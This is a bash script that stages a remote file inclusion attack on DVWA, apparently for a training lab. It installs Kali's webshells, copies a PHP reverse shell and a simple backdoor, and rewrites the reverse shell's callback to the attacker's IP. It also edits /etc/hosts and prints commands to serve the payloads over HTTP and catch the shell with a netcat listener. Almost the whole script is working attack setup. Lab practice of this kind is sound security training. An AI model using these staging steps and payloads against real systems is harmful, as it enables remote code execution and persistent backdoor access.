#!/usr/bin/env bash
#
# rfi_stage.sh — stage php-reverse-shell and simple-backdoor for DVWA
#
# USAGE:   sudo ./rfi_stage.sh [TARGET_DIR] [LPORT]
#          • TARGET_DIR defaults to /home/kali
#          • LPORT      defaults to 1234
#
###############################################################################

set -euo pipefail

########################  tweakables  #########################################
TARGET_DIR="${1:-/home/kali}"
LPORT="${2:-1234}"

REV_SHELL_SRC="/usr/share/webshells/php/php-reverse-shell.php"
BACKDOOR_SRC="/usr/share/webshells/php/simple-backdoor.php"
REV_SHELL_DST="$TARGET_DIR/php-reverse-shell.php"
BACKDOOR_DST="$TARGET_DIR/simple-backdoor.php"
###############################################################################

[[ $EUID -eq 0 ]] || { echo "Run this script with sudo/root." >&2; exit 1; }
[[ -d $TARGET_DIR ]] || { echo "Target directory $TARGET_DIR not found." >&2; exit 1; }

# ───────── colour codes ─────────
BLUE='\e[34m'
RESET='\e[0m'

###############################################################################
# Detect Kali (attacker) IP on eth0
###############################################################################
KALI_IP="$(ip -4 -o addr show eth0 | awk '{print $4}' | cut -d/ -f1)"
[[ -n $KALI_IP ]] || { echo "[-] Could not detect an IPv4 address on eth0." >&2; exit 1; }

###############################################################################
# Install + Stage Payloads
###############################################################################

echo "[*] Installing webshells package (quiet)…"
apt update -qq
apt install -y -qq webshells

echo "[*] Copying payloads to $TARGET_DIR …"
cp -f "$REV_SHELL_SRC" "$REV_SHELL_DST"
cp -f "$BACKDOOR_SRC"   "$BACKDOOR_DST"
chmod 644 "$REV_SHELL_DST" "$BACKDOOR_DST"

# ----------------------------------------------------------------------------- 
# Update callback IP inside php-reverse-shell
# -----------------------------------------------------------------------------
sed -i -E "s/^(\s*\\\$ip\s*=\s*')[^']+('.*)/\1${KALI_IP}\2/" "$REV_SHELL_DST"
echo "[*] Set callback IP in php-reverse-shell.php to $KALI_IP"

###############################################################################
# /etc/hosts helper
###############################################################################

echo -e "\n[*] DVWA HOSTS ENTRY"
read -rp "Enter the DVWA server IP address (eth0 inet): " DVWA_IP

[[ $DVWA_IP =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] \
  || { echo "[-] Invalid IP address format."; exit 1; }

if grep -qE '\s+dvwa\.local$' /etc/hosts; then
  echo "[*] Updating existing dvwa.local entry in /etc/hosts …"
  sed -i.bak -E "s/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+\s+dvwa\.local$/$DVWA_IP dvwa.local/" /etc/hosts
else
  echo "[*] Adding dvwa.local entry to /etc/hosts …"
  printf "%s dvwa.local\n" "$DVWA_IP" >> /etc/hosts
fi

echo "[+] Payloads staged and hosts file configured."

echo -e "${BLUE}\n1. Run these commands to catch the reverse shell:${RESET}\n"

printf "┌──(kali㉿kali)-[/home/kali]\n└─$ %bpython3 -m http.server 8000%b\n" "$BLUE" "$RESET"
printf "Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n\n"

printf "┌──(kali㉿kali)-[/home/kali]\n└─$ %bnc -nvlp %s%b\n\n" "$BLUE" "$LPORT" "$RESET"

# ----------------------------------------------------------------------------- 
# Connect to DVWA in browser
# -----------------------------------------------------------------------------

echo -e "${BLUE}\n2. Log in to the vulnerable web app with admin:password and click “Create/Reset Database”:${RESET}\n"
printf "┌──(kali㉿kali)-[~]\n└─$ %bfirefox http://dvwa.local/DVWA%b\n\n\n" "$BLUE" "$RESET"

printf "%b3. Make sure to run the dvwa-vulnerabilities.sh script on the DVWA server and ensure the DVWA security is set to \"Low\"%b\n" "$BLUE" "$RESET"
